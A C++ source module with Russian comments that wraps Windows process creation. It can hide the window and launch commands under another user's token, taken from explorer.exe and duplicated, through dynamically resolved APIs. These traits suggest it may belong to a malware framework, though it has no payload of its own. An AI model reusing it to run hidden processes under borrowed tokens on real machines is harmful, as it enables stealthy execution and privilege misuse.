#include "core\process.h"
#include "core\debug.h"
#include "core\file.h"
#include "core\util.h"
#include "core\hook.h"
#include <Wtsapi32.h>
//такое нужно чтобы взялась функция GetModuleFileNameExA совместимая с XP
#define PSAPI_VERSION 1
#include "psapi.h"

namespace Process
{

static DWORD ExecVA( DWORD options, const char* nameUser, HANDLE* hprocess, HANDLE* hthread, DWORD* exitCode, int wait, const char* cmd, va_list va )
{
	DWORD ret = 0;
	if( exitCode ) *exitCode = 0;
	if( hprocess ) *hprocess = 0;
	if( hthread ) *hthread = 0;

	char* args = Str::Alloc(1024);
	Str::FormatVA( args, cmd, va );
	DbgMsg( "Выполнение: %s", args );

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	Mem::Zero(si);
	Mem::Zero(pi);

	si.cb = sizeof(si);
	if( options & EXEC_NOWINDOW )
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;// FALSE;
		options ^= EXEC_NOWINDOW;
	}

	BOOL res = FALSE;
	if( nameUser )
	{
		HANDLE htoken = 0;
		if( nameUser == MAIN_USER )
		{
			DbgMsg( "Запуск под главным юзером" );
			DWORD pid = GetExplorerPID();
			if( pid ) 
			{
				HANDLE hprocess_u = API(KERNEL32, OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pid);
				if( hprocess_u )
				{
					if( !API(ADVAPI32, OpenProcessToken)( hprocess_u, TOKEN_ALL_ACCESS, &htoken ) )
						htoken = 0;
				}	
				API(KERNEL32, CloseHandle)(hprocess_u);
			}
		}
		else
		{
			DbgMsg( "Запуск под юзером %s", nameUser );
			htoken = Users::GetToken(nameUser);
		}
		if( htoken )
		{
			HANDLE htoken2;
			if( API(ADVAPI32, DuplicateTokenEx)( htoken, MAXIMUM_ALLOWED, 0, SecurityDelegation, TokenPrimary, &htoken2 ) )
			{
				res = API(ADVAPI32, CreateProcessAsUserA)( htoken2, 0, (char*)args, 0, 0, FALSE, options, 0, 0, &si, &pi );
				if( res )
					DbgMsg( "Запуск под указанным юзером успешен" );
				else
					DbgMsg( "Под указанным юзером не удалось запустить" );
				API(KERNEL32, CloseHandle)(htoken2);
			}
			API(KERNEL32, CloseHandle)(htoken);
		}
	}
	if( !res )
	{
		res =  API(KERNEL32, CreateProcessA)( 0, args, 0, 0, FALSE, options, 0, 0, &si, &pi );
	}
	if( res )
	{
		if( wait > 0 )
		{
			if( API(KERNEL32, WaitForSingleObject)( pi.hProcess, wait ) == WAIT_OBJECT_0 )
			{
				if( exitCode )
				{
					API(KERNEL32, GetExitCodeProcess)( pi.hProcess, exitCode );
				}
				API(KERNEL32, CloseHandle)(pi.hThread);
				API(KERNEL32, CloseHandle)(pi.hProcess);
				pi.hThread = 0;
				pi.hProcess = 0;
				ret = pi.dwProcessId;
			}
		}
		else
			ret = pi.dwProcessId;

		if( hthread ) 
			*hthread = pi.hThread;
		else
			API(KERNEL32, CloseHandle)(pi.hThread);

		if( hprocess ) 
			*hprocess = pi.hProcess;
		else
			API(KERNEL32, CloseHandle)(pi.hProcess);

	}
	Str::Free(args);
	return ret;
}

DWORD Exec( DWORD options, const char* nameUser, HANDLE* hprocess, HANDLE* hthread, DWORD* exitCode, int wait, const char* cmd, ... )
{
	va_list va;
	va_start( va, cmd );
	return ExecVA( options, nameUser, hprocess, hthread, exitCode, wait, cmd, va );
}

DWORD Exec( DWORD* exitCode, int wait, const char* cmd, ... )
{
	va_list va;
	va_start( va, cmd );
	return ExecVA( 0, 0, 0, 0, exitCode, wait, cmd, va );
}

DWORD Exec( DWORD options, DWORD* exitCode, int wait, const char* cmd, ... )
{
	va_list va;
	va_start( va, cmd );
	return ExecVA( options, 0, 0, 0, exitCode, wait, cmd, va );
}

DWORD Exec( DWORD options, const char* nameUser, const char* cmd, ... )
{
	va_list va;
	va_start( va, cmd );
	return ExecVA( options, nameUser, 0, 0, 0, 0, cmd, va );
}

DWORD Exec( const char* cmd, ... )
{
	va_list va;
	va_start( va, cmd );
	return ExecVA( 0, 0, 0, 0, 0, 0, cmd, va );
}

bool ExecAsCurrUser( const char* cmd )
{
	return Exec( 0, 0, cmd ) > 0;
}

}
